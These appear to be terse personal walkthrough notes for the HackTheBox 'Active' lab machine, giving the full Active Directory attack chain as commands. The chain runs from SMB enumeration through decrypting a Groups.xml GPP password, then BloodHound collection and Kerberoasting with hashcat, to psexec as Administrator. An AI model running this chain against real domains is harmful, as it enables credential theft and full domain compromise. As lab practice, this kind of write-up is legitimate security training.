# Active

* nmap -sV -sC 
    * Whole bunch of Active Directory box stuff


* Edit /etc/hosts file to add the machine domain
* Make sure box is within a minute of the box time

* nslookup
    * server 10.10.10.100
    * 127.0.0.1     => localhost
    * 10.10.10.100  => timeout
* dnsrecon -d 10.10.10.100 -r 10.0.0/8

* locate -r '\.nse$' | xargs grep categories | grep 'default\|version' | grep smb


* smbclient -L //10.10.10.100
* smbmap -H 10.10.10.100 -R Replication         => List contents of the directory
    * We see Groups.xml with local group policies
* smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q
* Groups.xml has encripted password

* gpp-decrypt $(cracked_password)

* impacket => GetADUsers.py -all -user -dc-ip 10.10.10.100 active.htb/svc_tgs
* imapcted => psexec.py active.htb/svc_tgs@10.10.10.100

* smbmap -d active.htb -u svc_tgs -p $PASSWORD -H 10.10.10.100

* runas /netonly /user:active.htb\svc_tgs cmd       => Opens a new CMD running with specified credentials
    * dir \\\\10.10.10.100\Users      => confirms we have access to the shares 

* cd /opt/BloodHound/Ingestors
* python -m SimpleHTTPServer

* Download .\SharpHound.exe 
* SharpHound.exe -c all -d active.htb -domaincontroller 10.10.10.100
=> Might need to modify DNS configuration for network to use 10.10.10.100

Back in linux host
* neo4j start
* cd /opt/BloodHound
* cd BloodHound-linux-x64
* ./BloodHound

* Drag and drop zip file obtianed by SharpHound into BloodHound

## KERBEROAST
* impacket => GetuUsersSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
* hashcat -m 13100 hashes/active.htb /opt/wordlist/rockyou.txt

impacket => psexec.py active.htb/Administrator@10.10.10.100